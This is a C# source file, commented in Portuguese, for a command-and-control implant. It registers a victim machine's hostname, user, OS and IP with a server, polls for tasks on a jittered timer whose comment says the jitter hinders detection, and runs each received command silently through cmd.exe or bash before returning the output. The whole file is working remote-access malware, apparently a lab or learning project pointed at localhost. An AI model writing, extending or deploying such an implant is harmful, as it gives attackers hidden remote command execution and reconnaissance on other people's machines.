using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Net.NetworkInformation;

class Agent
{
    // Configuração
    static readonly string SERVER_URL     = "http://localhost:3000";
    static readonly int    BEACON_MIN_MS  = 5000;   // intervalo mínimo (5s)
    static readonly int    BEACON_MAX_MS  = 12000;  // intervalo máximo (12s)

    static readonly HttpClient http = new HttpClient();
    static string agentId = "";
    static string agentToken = "";

    // Entry point
    static async Task Main(string[] args)
    {
        Console.WriteLine("[*] Agente iniciado...");

        // 1. Registra no servidor e salva o ID e token retornados
        await Register();
        if (string.IsNullOrEmpty(agentId) || string.IsNullOrEmpty(agentToken))
        {
            Console.WriteLine("[-] Falha ao registrar. Encerrando.");
            return;
        }

        Console.WriteLine($"[+] Registrado com ID: {agentId}");

        // 2. Loop infinito de beacon
        while (true)
        {
            try
            {
                // Re-check-in (atualiza lastSeen no servidor)
                await Register();

                // Busca tarefas pendentes
                var tasks = await GetTasks();

                foreach (var task in tasks)
                {
                    string taskId  = task.GetProperty("_id").GetString() ?? "";
                    string command = task.GetProperty("command").GetString() ?? "";

                    Console.WriteLine($"[>] Executando: {command}");

                    string output = ExecuteCommand(command);

                    // Devolve resultado ao servidor
                    await SendResult(taskId, output);

                    Console.WriteLine($"[+] Resultado enviado para tarefa {taskId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Erro no beacon: {ex.Message}");
            }

            // Sleep com jitter — intervalo variável dificulta detecção por padrão
            var rng   = new Random();
            int delay = rng.Next(BEACON_MIN_MS, BEACON_MAX_MS);
            Console.WriteLine($"[*] Aguardando {delay / 1000}s...");
            Thread.Sleep(delay);
        }
    }

    // Coleta informações da máquina e registra no servidor
    static async Task Register()
    {
        var payload = new
        {
            hostname = Environment.MachineName,
            username = Environment.UserName,
            os       = Environment.OSVersion.ToString(),
            ip       = GetLocalIP(),
            arch     = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            pid      = Environment.ProcessId,
            token    = string.IsNullOrEmpty(agentToken) ? null : agentToken
        };

        string json     = JsonSerializer.Serialize(payload);
        var    content  = new StringContent(json, Encoding.UTF8, "application/json");
        var    response = await http.PostAsync($"{SERVER_URL}/api/agents/register", content);
        string body     = await response.Content.ReadAsStringAsync();

        var doc   = JsonDocument.Parse(body);
        var agent = doc.RootElement.GetProperty("agent");

        agentId    = agent.GetProperty("_id").GetString() ?? "";
        agentToken = agent.GetProperty("token").GetString() ?? "";
    }

    // Busca tarefas pendentes para este agente
    static async Task<JsonElement[]> GetTasks()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{SERVER_URL}/api/tasks/agent/{agentId}");
        request.Headers.Add("x-api-token", agentToken);

        var response = await http.SendAsync(request);
        string body  = await response.Content.ReadAsStringAsync();

        var doc = JsonDocument.Parse(body);
        return doc.RootElement.EnumerateArray().ToArray() ?? Array.Empty<JsonElement>();
    }

    // Envia o output de um comando de volta ao servidor
    static async Task SendResult(string taskId, string output)
    {
        var payload = new { output };
        string json    = JsonSerializer.Serialize(payload);
        var    content = new StringContent(json, Encoding.UTF8, "application/json");

        var request = new HttpRequestMessage(HttpMethod.Put, $"{SERVER_URL}/api/tasks/{taskId}/result");
        request.Headers.Add("x-api-token", agentToken);
        request.Content = content;

        await http.SendAsync(request);
    }

    // Executa um comando no sistema e retorna o output
    static string ExecuteCommand(string command)
    {
        try
        {
            bool isWindows = System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                System.Runtime.InteropServices.OSPlatform.Windows);

            var proc = new Process();
            proc.StartInfo.FileName  = isWindows ? "cmd.exe"      : "/bin/bash";
            proc.StartInfo.Arguments = isWindows ? $"/c {command}" : $"-c \"{command}\"";
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError  = true;
            proc.StartInfo.UseShellExecute        = false;
            proc.StartInfo.CreateNoWindow         = true;  // sem janela visível
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd()
                          + proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            return string.IsNullOrWhiteSpace(output)
                ? "[comando executado sem output]"
                : output;
        }
        catch (Exception ex)
        {
            return $"[erro ao executar]: {ex.Message}";
        }
    }

    // Pega o IP local da máquina
    static string GetLocalIP()
    {
        foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (iface.OperationalStatus != OperationalStatus.Up) continue;
            if (iface.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

            foreach (var addr in iface.GetIPProperties().UnicastAddresses)
            {
                if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return addr.Address.ToString();
            }
        }
        return "unknown";
    }
}